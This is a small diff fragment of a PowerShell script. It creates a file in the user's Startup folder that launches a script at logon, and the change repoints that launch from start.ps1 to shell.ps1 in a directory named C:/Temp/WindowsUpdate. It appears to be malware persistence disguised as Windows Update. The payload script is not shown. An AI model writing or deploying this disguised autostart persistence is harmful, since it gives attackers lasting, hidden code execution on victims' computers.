@@ -6,4 +6,4 @@ $dir = $HOME+'\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\sta
 
 $file = New-Item -Path $dir -ItemType "file"
 
-"powershell.exe C:/Temp/WindowsUpdate/start.ps1" >> $file
+"powershell.exe C:/Temp/WindowsUpdate/shell.ps1" >> $file
